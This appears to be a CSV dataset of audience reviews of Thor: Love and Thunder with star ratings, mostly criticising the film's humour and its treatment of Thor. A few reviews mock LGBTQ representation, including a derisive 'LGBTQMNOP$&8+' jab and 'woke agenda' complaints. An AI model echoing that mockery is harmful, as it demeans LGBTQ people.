"""Movie of the week"" style of writing. Throws away all character progress for Thor from the previous movies. He's a clown. Feels like Disney is trying hard to destroy the Marvel brand. They're succeeding.",2.5
"I enjoyed the comedy of this movie. I felt that it touched my favorite aspect of Thor, and that is the comedy from his ignorance. Some say it was overplayed but I felt it was perfect.",5
"A disaster. I can't like this stand up comedian Thor, with jokes outta time. They managed to make Natalie Portman act badly. The movies with the same jokes and the dirty script got tired.",0.5
Wow just wow they made everyone in this movie such an unfunny clown it should not even be called Thor love and thunder it should just be called Thor at circus. JUST TERRIBLE!!!,2
What was Taika thinking ?!,0.5
Let down so hard. I didn't want to hate this movie but oh lord do I,1
"HORRIBLE. Waititi was given too much free reign here and created this horrible, cringe inducing, over the top, emotional train wreck, bad comedy that doesn't belong in the Marvel Universe.",1.5
"a disappointing follow up to what was an entertaining franchise in the Marvel cineverse. the humour often misses, the acting seems rushed to and the script and plot was nonsensical - even for a superhero movie! it's one saving grace is Christian Bale but even he could not redeem this Trainwreck",2
Taika Waititi should be banned from the MCU. This was absolutely terrible. Thor has basically become just a punch line. Here‚Äôs an idea Marvel: quit spending so much time trying to figure how to squeeze in a billion LGBTQMNOP$&8+ references and actually make a good movie.,0.5
This movie was an absolute joke. Probably the worst marvel movie yet,0.5
a fun movie for kids but such a disappointment that they turned thor into a joke character and refuse to give him a decent story arc little brother enjoyed it who is 7 i did not,2.5
What a mess. Took everything genuinely funny about Ragnarok way over the top to the point of absurdly unwatchable. And wasted another brilliant villain performance by Christian Bale by relegating him to an illogical revenge motive.,1.5
Tries to be funny but fails. Boring story and boring characters.,1.5
Definitely not a bad entry into the MCU and that's the only audience it needs to cater to.,3.5
"Mess of a movie, ruined the Thor franchise.",0.5
"I feel like director Taika Waititi should move onto a different project, after he has made a contribution to a franchise. This film provides strong evidence for that belief.",1.5
"I can't get that time back. Somehow marvel studios allowed several strong characters, a good core story line, and a quality franchise with strong momentum to be reduced to a campy, goofy worthless addition to canon. Such piffle it made Eternals look like a classic.",0.5
"This was a travesty, I love Taika Waititi, I love Thor Ragnarok, but this was horrendous. They wasted Gorr, they wasted Christian Bale, they wasted the movie.",0.5
"The effects were lacking, the plot was weak, and the hole thing came off as some crappy 80's movie. The acting was just as bad. Marvel has ruined Thor. What once was a fun loving yet believable God of thunder has now become a big joke. And at the end everyone can become Thor? What a way to cheapen the character.",2.5
What in the actual fu,1
"Fun and entertaining on a VERY surface level. The music is great, Bale is intimidating and great and the screaming goats will make you laugh. Note to the critique: this movie survives on flashy cinematography, banter-ishly unnecessary quips and little else. The Gorr story has so much life too out that got completely ignored, Thor is once again made out to be the village idiot and ancillary characters are portrayed as Thor‚Äôs peers or betters (when it‚Äôs not). Thor needs a pick me up if these movies are to survive.",2.5
The comedy of the movie made it very hard to pay attention to the seriousness of it all. It was too fast which made it unenjoyable. and the return of a beloved character only for her to die off instantly was a waste of a character. Terrible movie,1
Its bad and humor is babyish and but gorr is pretty good and had a pretty good qoute at the end.,2.5
"At first, I thought it was a good movie. But I couldn't even rewatch it. I like the villain but the story is plain and the acting is meh- besides Christian Bale.",3
Tr√®s ordinaire trop enfantin trop humour facile tr√®s d√©√ßu,2
"The first Thor film was great. Thos one is awful. Props, storyline, characters are all rubbish.",1
"Save for a few fun scenes, Love and Thunder lacks the whimsical nature of its predecessor and feels choppy and unfinished. The ending fell just as flat as it's villain.",2.5
Loved it =D it was hilarious!,4.5
"Love the storyline and production towards this movie. If the unnecessary jokes removed, it will be an epic series after Ragnarok.",4.5
7.5/10‚Äî-Marvel is getting way too goofy for its own good,3.5
"Waititi went a little too far this time, unfortunately",2
Kinda mid; I miss old MCU films :(,1.5
"Absolutely the worst Marvel movie to date. It‚Äôs a spoof, an insult to the genre. How this ever got released is a surprise‚Äî Marvel‚Äôs brand took a major hit with this off-brand nonsense.",0.5
"Just the most goofy part of Ragnarok pushed to the extreme. Playing always on some kind of ""fun"" part with silly jokes and goofy scene. Had the potential to be a great movie, ended up like some sort of parody of the MCU. Only good part was Bale doing a great job.",1
Marvel has seriously gone downhill. After Avengers infinity wars part 1 Marvel has gone bad. This movie pained me with such silliness and mediocre screenplay.,0.5
The 5 minute presence of the Guardians of the Galaxy isn't enough to save this movie. Distractingly bad CGI paired with far too many jokes that don't land.,2
"Awful, we walked out. The direction for Thor was slap stick benny hill nonsense. Christian bale probably has back problems from carrying the whole film but we couldn't make it to the end as it tried to hard be silly and no adults laughed. Everyone 8 years old and under enjoyed it though, should tell you where the directors mentality is at. Definitely does not excite you for an avengers thor appearance, felt more like spinal tap but less funny. Director went all in on his worst tendencies.",0.5
"Just a parody of the films before it! Why have they turned a god into a joke?! Chris Hemsworth is either spending every day laughing all the way to the bank or trying to get out of his contract. This universe is ruining careers, but making millionaires",2
The best part of this movie was the excellent soundtrack.,2
"Overall, it's a good film with Omnipotent City (successful jeu de mots) somewhat reminiscent of a scene out of star wars with exciting fight scenes to match but the constant need for humour interrupts the serious edge that the film desperately needs and that worked so successfully in the first 3 films. It's worth a watch, but my least favourite Thor movie and a disappointing addition to the Marvel Universe. Corg is now exhausting his role as the provider of witty banter... Do I love his character? Yes. Do I need to see him all the time? No. He would be much better off appearing in occasional scenes, as this took all the seriousness and emotion out of the storyline. Here's hoping this changes.",3.5
One of the worst marvel movie ever. I pity the fool who watched it in cinema.,1
"The story line itself was great, and well thought out, but the execution was very sloppy, compared to what the series have been so far. If the other Thor movies are equated with The Land Before Time, then the Love and Thunder movie would be more like The Land Before Time 2 or later. It is family friendly, and should be exciting for kids, but far too silly, and frankly, simple and childish, for anybody expecting a more serious Marvel masterpiece.",2.5
"Movie sucked it made a joke out of Thor and Jane. Gorr is just a child kidnapper, this movie sucked so bad. Even the Thor actor said that it was bad. Cgi was horrible, and the director took it way to far. This movie was so very bad. Thor was such a cool hero in Infinity War, and now they make him a joke. WHY DID THEY DO THIS!",1
just relax and chil not perfect but still good,3.5
"Comic. Not compelling as an adult movie, yet entertaining enough for a family dinner showing. Love Natalie Portman‚Äôs return, and Christian Bale‚Äôs portrayal of a pure villain. I think kids will like it",2.5
It was the worst marvel movie yet,0.5
What did they do with THOR,1
This is where Thor jumped the shark. The strength of Marvel's movies are the optimal mix of action and humor but this movie seems to have been written by HS sophomores.,1
"Ruim? N√£o. Mas tinha um potensial que n√£o foi explorado. O arco da Jeane Foster podia ter um peso de verdade e foi deixado de lado. E o Gorr podia ser um grande vil√£o com o qual o p√∫blico podia ter empatia, mas ficou gen√©rico demais.",2.5
"THIS FILM IS AN EXERCISE OF THE DIRECTORS EGO , the film is quite possibly the stupidest so-called comic book film I have ever watched , it makes batman and robin , and catwoman look like Shakespeare. I hope that all the studios have seen this film and they realize that Taika Waititi is a complete hype job .",0.5
What happened to the original Thor?! Was not expecting a comedy with an incredibly stupid storyline and no point‚Ä¶,1.5
It has some action for a comedy movie.. joke afer joke... children saves the world? Mcu is going down hill..,0.5
"Does this movie go too far into the silliness that Thor: Ragnarok brought to the MCU? Yes. But that doesn't mean it's not still very fun. While the plot doesn't make a ton of sense, and the character motivations seem to bounce wildly around the universe, Hemsworth still manages to wring some fun out of this bizarre movie. At no point is the point of Gods in the MCU and the expansion of the really weird and metaphysical side of Marvel comics interrogated, screen time is instead spent on screaming goat jokes, an absurd subplot about a jealous axe, and Christian Bale acting in a COMPLETELY different movie. But, it's fun ride! Don't think too hard and just enjoy the chaos",3
joke of a movie. would rather watch cardi b,0.5
"This movie was awful. Gorr is one of the worst villains out there. Let me paint this picture for you with Gorr's reasoning: He states multiple times over the film that all gods are bad and corrupt. Right? So why does he kidnap children to lure Thor out? If he believes all gods are bad, why does he take this approach because by definition, Thor would be a bad god. And most of Gorr's treatment in the movie is purely off reputation cause all his butchering happens off screen. And Jane Foster could've been great, but her character's progression was comical at best, not learning any real lesson. And she doesn't even become worthy of the hammer- Thor puts an enchantment on it. That's messed up. This movie sucked",0.5
"There's something to be said for writing a movie around a few unfunny jokes, and hoping the plot sorts itself out. Christian Bale and Chris Hemsworth try their hearts out over a nonsensical plot, ridiculous character arcs, nonsense humour and an overlong run time. This movie makes no sense, and doesn't deserve to be considered in the same breath as Ragnarok.",0.5
The worst one of the Thor films. Just bland and boring. Also not a great pic for a villain.,1.5
"Though it wasn't as funny as Ragarock I still thought this was a well done, hilarious movie.",5
"Certainly a low point in the Thor series. Campy, silly, immature and incoherent.",2
Not great but fun to watch. Tried too hard to be like Ragnarok. A little too campy.,3
"I have no idea how the audience scored this movie a 77%. I thought it was terrible. Thor is a clown now. They should moved on from the chris hemsworth thor with some dignity, and just replace him with the natalie Portman or some other female to play thor. The chris hemsworth thor is just a joke now.",1.5
"Like Thor throughout the movie, this film felt lost compared to the others in the series. (50%)",2.5
"Odczuwalnie gorszy od Ragnaroku, jednak nadal do≈õƒá autorski jak na standardy MCU. Gorr i jego krucjata fajnie przedstawiona, ≈õmieszne ≈ºarty oraz campowo≈õƒá",4
"fuck everyone this movie is a ton of fun. Is it Taikas best? Absolutely not. Is it a fucking insanely enjoyable movie? YES! Istg rotten tomatoes users those two things can correlate. Movies arent always ""good"" or ""bad""",4.5
There is just too much none sens to enjoy a movie that long they kind of ruin the franchise with this one.,1
It was an enjoyable movie but it didn't live up to my expectations.,3
How many times has Thor hit his head to become this dumb,1.5
"So much potential. Wasted it all, tryhard humor. No real action, zeus was useless. Everything was bad. The trailer was 10/10. Movie 0/10... so sad about this high potential movie.",0.5
"For now, i dont like this movie. So first of all, the humor didnt hit me once, literally not once, except for Korg and Dwayne, that was a good one. This movie has a lot of aspects that people loved about Ragnarok and turns it up a level, for example the goats and other jokes, i am sure it made a lot of people laugh, but it was overdone. Chris Hemsworth, Natalie Portman and Tessa Thompson are amazing in this movie, they are truely an iconic trio. Christian Bale as Gorr didnt fully work for me, he didnt have enough screentime to fully flesh out his character, which sucks because there were a lot of great scenes with him. The movie has a lot of different tones, colorfull, gray and black and white and it all feels like they are living within each other, which is not a good thing. The movie has incredible VFX and sometimes cinematography, which at this point everyone expects from a marvel movie, but i still wanna praise the VFX artists for there incredible work. What worked really well for me, was the emotion between Natalie Portman and Chris Hemsworth, it really was the highlight of the movie for me, but then *Spoilers* they show that Natalie Portman got to Valhalla, which just immediately makes the emotion less heavy. Overall this movie had so much potentional, but by far didnt reach it.",2.5
Meh. The downward trend of Marvel continues.,2
"HOT PEOPLE EVERYWHERE (Not you Russell Crowe) For the haters: It's SUPPOSED to be a goofy, fun, romantic summer superhero movie. Nobody wants to cry in July, that's what December movies are for. Sheesh.",4
"P√©sima, Taika vuelve a no tomar en serio una saga y hacer lo que quiere con roles comprometidos.",1
EVERYONE IS GAYü§¶üèΩ‚Äç‚ôÄÔ∏èü§¶üèΩ‚Äç‚ôÄÔ∏è,0.5
While not the best Thor story I felt Chris Hemworth and Natile Portman did their best to carry the film. Christian Bale was outstanding as Gor and brought a lot of feeling to a very dark character arc.,3.5
Pretty mediocre. I guess it was better than most. Dc movies but not really up to the standards of marvel.,2
I don't really know why people hated this movie. It was funny and great. All the characters were so funny and the humor was great. It was sad but it also made a great ending to connect it to another Thor movie. Definitely would recommend.,5
Staring at a wall for two hours would've been a better use of time.,1
"Terrible writing, even worse directing. Does not compare to Thor Ragnarok",0.5
"oh my... terrible movie, Thor is supposed to be a comedy now? where Thor now become a supporting character to ""she-Thor"". The story totally forgot why Thor become such a loving character. A sense of entailment surrounds this movie, that makes it a disaster.",0.5
Disney Marvel is quickly becoming dull. There is little to the story and like all phase four movies. Thor is relegated to comic relief and sidelined in his own movie. Formulaic and boring.,0.5
"I pretty much didn't get the backstory of Gorr here, but if Taika Waititi did more scenes with Gorr and less comedy; which is in fact cringey, and more on action, this movie will be great.",2
Disney just can't continue the old guard. There's no helping it. Marvel will never be the same. Such a sad thing...,0.5
A really big miss here. Tried to be a comedy and many of the jokes weren't funny. Jane foster's character was wasted as well as Christian Bales. This movie just make Thor dumb.,0.5
Way too silly and goofy.,0.5
The beginning was good but it kind of got stupid and cheesy at some point. I wish they'd make Thor movies like they used to.,2.5
"Overall, seeing The Strongest Avenger return to the big screen is another blast.  It's great to see this film take a darker and deeper turn with its story while bringing all the randomness and gags of Thor: Ragnarok back to the screen again.  Chris Hemsworth is a delight, and it remains evident that the actor is having a good time.  Visually, this film is pleasing in many areas, including its effects and costume designs.  The returning and additional new characters, including Gorr the God Butcher, are highly entertaining.  The runtime flies by like Thor's hammer, and in the end, while the film takes a minor step back, it still delivers another worthy instalment to this epic Marvel franchise.",4
"This is a fall from grace for marvel. There are two redemptive things I liked about this movie, Christian Bale as Gorr the God Butcher and Natalie Portman as Jane foster, who easily stood out as the best parts of the movie with moving character arcs. That being said screaming goats, god orgies, and rapid fire jokes take up 99% of this movie, and the cg of this movie is borderline unwatchable at some points. This movie is so bad my buddy I went to the movie with passed out when we went to go see it in theaters.",1
"As incredible the cast may look, the movie Thor: Love and Thunder itself is rather disappointing. It sometimes feels like you get hit yourself with Thors hammer.",2.5
"I don't usually write reviews about movies, but I had to write about this one. I am not a huge Marvel fan, but I enjoy some of their movies; they are entertaining and can help you pass the time. This is simply the worst Marvel movie I have ever seen. To call it a childish movie would be an insult to movies made for children, e.g. Nemo etc. It is also an insult to Norse mythology, actors who played in the movie, and previous Thor movies among others. What's worse is I watched this movie after playing God of War Ragnar√∂k. Now that game was how a story about a mythological character should be. This movie is so dumb and simple, with an idiotic story. They wanted to make it light-hearted and fun, but it is simply stupid and boring. Don't watch it unless you are a huge Marvel fan.",1.5
"Thor's definitely been my favorite in the stand alone characters so far and maybe Ragnarok set the bar too high but this one just felt like it missed some attention detail and the quality that Ragnarok possessed. It started strong enough but quickly started pouring on the corny a bit too thick and that went on throughout. Background and development of the villain was good (as usual) but felt like they fast forwarded a bit through Jane's development/story along with other characters that seem like will be around in the future. Good acting and some great cameo's like Luke Hemsworth playing Thor during a play in the movie. Finally, felt like it was a bit lost as to the age of target audience they were targeting as it was a bit of a hard PG-13 but at the same time it had a bit too many childish moments for adults. I like that they make these movies fun for adults but think they should keep the PG-13 rating closer to PG.",3
"Taika waititi ruined Thor l God of thunder leaving him as a Buffon unfortunately, it is a boring movie with horrible effects",0.5
"Amo o Thor e toda a sua saga, principalmente o Ragnarok, mas esse filme foi bem abaixo. Parece que toda hora tem que ter alguma piada, e acaba perdendo um pouco o esp√≠rito do Thor.",3
"Thor Love and Thunder is a fun move with a great cast. Thor relies heavily on the ""fish out of water"" comedy that has been present since the first Thor movie. It is funny, full of laughs. But it doesn't add much to the Thor/Marvel story at Present. There is a scene to suggest that there will be more Thor movies, but it felt like a filler movie.",3
I wanted to not like this movie but I loved it.,4.5
I thought the movie was a fun romp for the fam. Only people who seem to hate this movie are YouTubers and Twitter users.,4
I don't know why this movie got a bad rap. I thought it was thoroughly entertaining and I enjoyed the silliness. You won't fall asleep during this 2hr movie like you would during many others these days,5
"Slapstick, unrealistic comedy. Worthless plot. How can you invest in the dramatic issues of Jane with all the silly-ness that is going on...",0.5
decepsionante ü§ôü§ôü§ôü§ôü§ôü§ô,3
"Taika's sequel to Thor: Ragnarok is... questionable and for the most part, pretty decent after I seeing it in theaters. Things that really carried out is Natalie's performance as Jane and the Shadow Realm fight, which that was a WOW moment and really epic. Problems that I found out about Love and Thunder is the light-hearted tone ruins the whole film and unfunny jokes aren't landed well here. Christian Bale's character is too wasted and the story is rushed and confusing, and last but not least, there are scenes with bad CGI became mememable. In my opinion, Thor: Love And Thunder is very decent enough. Much worse than The Dark World, though. But there are moments that became enjoyable, too. The plot is a massive downfall to Chris Hemsworth's character arc, and need a bit better. 5.5/10",3
"It was honestly a good movie, kept my interest, it was funny and is in line with how Thor was discovering himself after all the events. It was nice to see a huge hero become human instead of the other way around. Of course we will see him in a more serious role becoming a leader again and that will be good, this was a nice break and I laughed quite a bit and had some moments of sadness thrown in. Loved hearing all the Guns n' Roses tracks as well.",5
"It was one of the worst Marvel movie. The jokes weren‚Äôt even funny, it was too much. The only good thing was the soundtrack.",0.5
The floating kid's head looks lt was made in Microsoft word and the end seemed a bit like a Indian marriage,0.5
Simplesmente o pior filme da marvel,0.5
"no story, i expected more from Taika",2.5
What happened to the wit of the Thor franchise? The incessant juvenile jokes were too much since most fell well short of humor. I didn't even finish it (streaming) because I was too bored.,2
Terrible. Worst of all the Thor films. Nearly unwatchable,0.5
"This is, by far, the worst Marvel movie I've ever seen. Not funny and not good. They ruined Thor.",0.5
"This movie hits harder emotionally than some might expect. The villain is good, the story-telling funny, and my inner child was losing his mind at the end.",4
Well that was awkward.,2
"Great movie overall. However, tons of unnecessary and unfunny scenes. Natalie Portman was great",4
"Thor was portrayed visually appealing of course but intellectually he was lesser than in this movie. Where was in past movies, he was a leader, he was intelligent, self aware and strong minded. I think they made this movie too much about his physique and less about the character they built up which disappointed me.",2.5
There was no balance. It was just a slapstick movie. Nothing inkeeping with Thor's character in any of the other stages of MCU. Jane was out of place too. Just felt like she was editing in after the fact in terms of her storyline. There is nothing organic about any of this.,1
Bored and annoyed most of the film. Watching this made me realize what it's like for non-comic book fans to watch these kinds of films. Such a let-down after the fresh take that was Thor: Ragnarok,3
"This movie is definitely a bad movie , but i can't stop enjoying it, despite it flaws. First of, there is too much humor and while i thought the humor was great, it makes the serious and emotional moments underwhelming, as it feels like the movie won't let me feel anything. The first act is genuinely awful, but it got a lot better during the second and third act. I was entertained, but nothing more. The VFX are either hot garbage or as fantastic as usually. Gorr is definitely the highlight of the movie. He brings the drama that is missing and is so enjoyable to watch, especially seeing as he's played by Christian Bake. While it's definitely bad, it's still a good time.",2
"Pretty visuals, but the story is trying to be obnoxious I don't get it.",1.5
"embarrassing effort, looks like no one was there to vet the script, near the bottom of my marvel list sad to say",1
"It really wasn't as good as the other thor movies, it's very goofy. It fits thor but everyone is extra now and its a bit of a simple movie we didn't finish.",2.5
"Thor, Love & Thunder was a romp & a half from start to finish. It's a good balance of a fun comic book movie, & questions of faith, weakness, strength, complacency, & willpower. For our characters, it's a proper send off, & a new beginning.",4
"Ruined the brand. Prepubescent humor, ignorant and childish.",0.5
worst mcu movie by far.,0.5
Such a wasted opportunity to use these characters and the Gorr storyline.,1
Prova ser mais par√≥dia do que um filme do thor. N√£o recomendo para quem nao tem Disney+,1
uma piada e vergonha alheia ambulante,1
Why would you make THOR look like a bumbling idiot!?!?,0.5
"After so many MCU movies, it's very hard to say something new, but this last Waititi product is a Disaster; it looks like, the whole script is made out of a single ingredient. Same ingredient that, in small doses, contributed to make Thor Ragnarok (which he only Directed) a good movie: Himself. Why don't name it ""Waititi, jokes and thunder"" then? He made this movie ""in His image, in His likeness""...but the result is quite pointless. My only praise goes to Bale's costume/make up/performance.",1
"It's a perfectly decent film - I enjoyed it, but I'm not necessarily desperate to rewatch. It's hard for it to live up to the presence of Ragnarok, but the humour is similar and there's certainly a good few laughs to be had. I'll watch it again eventually.",3.5
Ridiculous but unfortunately not funny ... Marvel keeps destroying their franchise,0.5
"Boring, incoherent, unfunny.",1.5
"ok I tried to watch ""Thor: Love and thunder"" on D+ but ugh, wrong theme, bad dialog, bad acting even. I mean did they forget how to act or who they were supposed to be... Bla I won't get that hour back and I didn't even watch the whole thing...",0.5
"Taiki Wattiti ruins another great Thor story. When will Marvel learn, Thor isn't the comedy relief? That spot is soly Peter quill's. If they aren't careful, they will ruin a character that has the possibility of having great range and depth. Natalie Portman is a fantastic addition as always. Visuals are stunning and Christian Bale, despite usually being a cardboard cutout, brings range to a one trick character. All in all, 3.75/5",3.5
It was annoying to watch. The comedy was lame and the story boring. I was beyond disappointed especially after how good ragnarok was,0.5
"Too slapstick and silly to be taken seriously. Chris Hemsworth and the rest of the cast were great and did what they could with the limited scope of the story but we need Thor to go back to the original vision. This is such a great franchise, it would be a pity if they let it tank because of Taika Waititi's Charley Chaplin take on Thor",3
This was the most disappointing movie in the MCU world. I couldn't even finish it without being disgusted how they made Thor out to be. A God turned into a joke! How could they go from Ragnarok to THIS?!?!?,0.5
Suspend any outside expectations and just enjoy the movie. First half of the film is rough to get through but the second half is entertaining and the last 5-10 minutes are great.,3.5
"Saw this once and don‚Äôt care to see it again. It‚Äôs a forgettable movie, I was bored watching it, which is a newer experience for me watching Marvel movies. Also Thor used to be a cool character, now they‚Äôve made him into a wuss",1
"This film showed me that it's probably time for Taika Waititi to go back to making indie films and stay out of the superhero business. I gave this film one star for getting me to truly care about the relationship between Thor and Jane Foster, which up to this point I thought was always awkward and boring, and I gave it another star for Christian Bale's performance and his villain being the most interesting character. I wish we would have gotten to see more from him. Other than that, this film was just too kitschy to take seriously.",2
"enjoyable in some moments, unfortunately however extremely superficial and humiliating for the main character who is repeatedly humiliated to follow the woke propaganda that dominates in disney",1.5
Desapontante...√© dif√≠cil levar um filme a s√©rio quando nem o pr√≥prio o faz.,2
"Honestly, it was ass all around.",1.5
The best thing about this Movie was Christian Bale. I dont know what reason there is for Thor to get dumber every movie. It was just way to childish for me.,0.5
Sadly a fall from grace from Ragnarok. Seems like Thor has been ruined.,2.5
"Interesting tone to the movie. It feels like it was trying too hard to be funny even though Thor and the rest of the cast have a funny tone in the first place. The movie didn‚Äôt need to try that hard. As for the reasoning for the appearance of Mighty Thor, it felt completely out of place with the rest of the movie trying to be too funny. I loved that they brought in mighty Thor, just not the reasoning for her. The performances by all the actors are great as the rest of the Thor movies have been. I have a ton of respect for Taika Waititi and loved Ragnorok, but this one didn‚Äôt quite hit the right tone. The action was great and there are some really great sequences and acting in the movie. All in all, if they picked one tone and stuck with it, it could have been better. I will probably still give it another watch through.",3.5
"Ooof, This is what happens when you give Taika Waititi lots of money up front and tell him to just do anything he wants... No wonder Hemsworth wants out.",2
"By far the worst marvel movie I've seen, at least in the last several to a dozen years or so. There was way too much silliness; I felt as though it was an MCU comedy special of some sort. There were a few moments that were good, but overall I'd call this a flop.",2.5
Another great installment in Thor's Saga. Really enjoy Thor Growth in not only a god but as a character. Seeing him stuggle to deal with loss and greif and eventually finding hope and love again. Here looking forward to the nxt chapter.,4
Please‚Ä¶‚Ä¶ coming from a huge fan. Remember you are a GOD and not a lame comedian. Remember child!!,1
I love all the Thor movies and I loved this almost as much as the 3rd one!,5
"Shame what they did to Thor, even Bale, and Portman couldn't save this movie. Wasted actors in this film.",1.5
"Worst Thor movie ever, nothing makes sense...",0.5
"worst sense of humor I've seen in years, story was as bad as comedy. Good CGI though",2.5
"Somewhat entertaining but nothing special. It has the humorous one liners, but predictable & very fun of the mill.",3
"The movie ""Thor: Love and Thunder"" was an absolute disgrace to the Marvel franchise. I personally have been a long-time supporter and fan of Marvel. In general, all of their movies are very well made and thought together. This newest Thor movie is not at all. The storyline of the movie seems thrown together. There are also random moments throughout the movie that do not need to be there for any reason. I am especially disappointed in this movie because the previous Thor movie, ""Thor: Ragnarok"", was one of the best movies Marvel has ever created. If you are expecting another good Marvel movie then do not go watch this movie!",2
I love marvel and DC Superhero‚Äôs!!,5
Absolutely boring. Never gets going and filled with uncomfortable moments. Everything is approached as a joke and nothing lands Waititi should not be allowed to direct anymore.,1.5
Thor really tried to force the comedy in annoying ways and it ruined and already lackluster movie. The Gorr the god butcher scenes were the only redeeming part of the movie. It should have focused more on that character.,1.5
"The character has been somewhat weirded me out, seeing him so action focused and really serious in the last of the infinity saga, and now a stupid man child made this movie weird, the action was cool, and the interaction with the villain was awesome, but the introduction of these powered childrens and the silly as ever thor does not do it for me",3
It's more like a parody of a marvel movie rather than an actual marvel movie. A complete cringe fest of bad jokes. Terrible.,0.5
"For Marvel fans, any time spent in Taiki Waititi's Thor Universe with comic Chris Hemsworth is time enjoyable. And the movie is visually incredible. But unfortunately, Waititi took the things that made Ragnarok a surprise smash and overstuffed them into this movie ... there are too many bits, too many zingers to make the films ""godly"" stakes land an impact by the emotional climax. And the movie's overall irreverence for the larger MCU leads to plot holes too big to ignore.",3
What the actual f... this installment is forgettable. Trying to recreate the same humor in Ragnorok just entrenches new Thor as an unlikable moron.,2
Ok. Worth a watch but not great.,2
"Waititi's act wears thin, and the film should be far more focused on Jane but there is a lot to like, especially the villain.",3.5
Thor...what happened? This movie just tried to push the jokes too much. So much that it took away from the story. They passed over that humor line too far and to me it just ruined the movie. If they had dialed it back a quarter or more it may have been something great.,3
"Chistes sin sentido, p√©simo cgi, actuaciones poco memorables que tienden a ser rid√≠culas como la de Bale, que sin duda es un gran actor. Desperdicio de personajes por una trama sin sentido en ocasiones, para ser dirigida por un director con oscar deja mucho que desear. Es un baj√≥n de calidad para lo que Marvel nos tenia acostumbrado.",1.5
"I thought it was really funny and the action was great. Overall a good Thor movie. Not quite as good as Ragnarok, but probably the next best Thor movie.",3.5
Grate fim dont se wy evry body hates it,5
no me gusto. mucho chiste sin sentido. un guion sin sentido . no pude terminar de verla,1
Goats carried the film,2.5
"Sorry but I have to say and here we go again with the same easy movie with no solid plot, the same idiotic humor repeated and repeated that ridiculizes the character (Thor) and the male figure in general seeing a nude thor and some silly. Besides Odin is really fat and its did on purpose on screen. I dont get this bizarre humor or who can like it. Plus suddenly jane (Natalie Portman) got powers from the nowhere and its stronger than Thor itself. Wow ! It's an absurd",0.5
They wasted gorr. Jane foster came back. CGI was a mess. They ruined Thor.,1.5
"The awaited sequel to Taika Waititi's Thor: Ragnarok is a major miss as it takes the humor that made its predecessor so enjoyable a bit too far. The repetitive, on-the-nose gags and uneven storytelling make Thor: Love and Thunder another tedious addition to the declining MCU. After the atrocious Doctor Strange in the Multiverse of Madness and the utterly disappointing Thor: Love and Thunder, it seems Black Panther: Wakanda Forever is the only Marvel movie left with quality to offer viewers still willing to stick around.",2.5
"I LOVED IT!! I go see these movies to get away from this grey and dismal world. I don't expect Shakespeare, but I do expect to be transported by the visuals and the action and the story, THIS MOVIE HAD ALL 3! Thor was awesome, Jane Foster was wonderful, Val was amazing and Korg was perfect. I loved this movie from the first scene to the last credit. Keep ‚Äòem coming! 10/10",5
I thought it was a different movie,2.5
"It is seeming to make a joke of itself. The comedy is too much. Instead of sprinkling it in when the timing is right, they just took the lazy route and put it in to the whole movie. It just doesn't feel like the same Marvel.",1.5
"I am a big Fan of Marvel movies but this was the worst Thor movie yet, tried to hard to be funny, Ragnarok was good and probably my favorite Thor movie, but this was just taking it to far in the wrong direction with things that were just not funny to me, a poor repeat and exaggeration of Ragnarok that lost my attention and by half way I was wishing it was over",1
"This is the worst Marvel movie, just a terrible movie. The movie tries to be funny, the only good thing in the movie is its villain.",2.5
Worst Thor film ever made basically a joke marvel seem to have lost there way,0.5
"Mazbe the movie was a bit to comedic, and gorr was not as good as in the comics but it was still a pretty good movie.",3.5
"Thor? what Thor?, there is no Thor here! shame on marvel",0.5
"It was an amazing experience.The visuals were top notch,with sweet rock n roll music and quality acting by Chris Hemsworth, Natalie Portman and the cast.The first half of the movie is super creative with just a bit of overuse of humour. But the second half will get you down to the feels.",4.5
Third best Thor movie. It paced a bit fast. Comedy wasn‚Äôt very good. Acting was okay for the most part. Bale almost delivered the tortured and painful performance of Gorr but it just felt rushed. I couldn‚Äôt connect with the character as much as I would have liked. The story line was decent and CGI was pretty good overall.,2.5
As a marvel fan it was hard to watch. Tuor continues to be used like a punchline instead of one of the most powerful characters in the marvel universe,2.5
the only reason the rating this high is cuz it funny movie - Light 7/10,3.5
"Fun comedy action movie, but Thor as a punchline to a joke is tired.",2
"The trying of being hilarious all the time and the poor connections with something serious in the MCU made this film the worst. I just feel sorry for the actors, which is the good part of the film.",1.5
In terms of quality and tone & tenor it is pretty much what you would expect from the franchise. I found it entertaining.,3.5
Ludacris! I walked out within 15 minutes.,1
"I give the production quality 4 stars. Story is 3. It was ok not great. Woke agenda: -1 star. Enough with the goddamn rainbows and same sex relationship references. Tolerance does not need to be shoved down our throats. I'm happy with people being happy as who they want to be and who to love, but stop with the politics. Let people decide for themselves what they do and do not tolerate. Let parents take their children to a movie without worrying about indoctrination, and just see a good movie. I miss the Disney I used to love. Old Disney inspired me and changed my life. I grew up watching Disney cartoons. New Disney makes me want to vomit. Stop and go back.",2.5
love Thor but I miss the suspense and depth previous movies had . they making these all comical and goofy . less action and crappy acting . ruining what it should be,3
"This movie is so bad. It does not make any sense to make Thor that stupid. He literally has 0 depth. Marvel had a great opportunity to create a very deep character, given that Thor has a background with immense suffering. But no, lets turn him into a joke that is as dumb as a door and completely hair-headed. The plot also makes no sense. Given the way the gods were portrayed, the ""evil character"" was not that evil. Overall this is almost as bad as Wonderwoman 84",0.5
"How do you go from Ragnarok to this mess? Ragnarok was a gamble that could have failed miserably, but fortunately worked very well, mainly because it gave longtime fans plenty to hold on to. This is a mockery to fans, and mix in an overabundance of off target humor, a criminally underused and underwritten Christian Bale/villain, a main character that's suddenly stupid and unappealing, Natalie Portman in her most phoned-in performance ever, writing at best that's... look, you get the point. It misfires on every cylinder. Even the CGI is comparatively weak.",1
Not the best Thor movie but definitely not the worst one,4
The only thing that saves this movie from the worst rating is Christian Bale,1
"Not every Marvel movie needs to be Guardians of the Galaxy. If they could chill with the stupid gags and blasting GNR for more than 10 seconds, it would probably work, but it can't decide when to turn off the freaking goats, which weren't funny at first, let alone the 50th time. It's a shame bc it has the pieces for a great movie, but the actual execution is horrendous.",2.5
"Love Thor, Last one was great but the M she U strikes again! He is a complete joke! No wonder Chris refuses to work with this "" Mad director"" again",0.5
Christian Bale is the only redeeming quality of this movie. Some cool visuals but nothing extraordinary.,1
entretenida hasta cierto punto,1.5
"The film was very shallow, without a script to present the past of the characters and villains. Gorr didn't have any development, in 1 minute he shows what happened and after that he goes out killing Gods, epic battles that they didn't bother to show. For me, total disappointment, I had high expectations.",1
"A disappointment. Taika had an amazing run: Wilderpeople, Shadows, Ragnarok, Jojo. Hopefully this doesn't mean he's lost it forever.",3
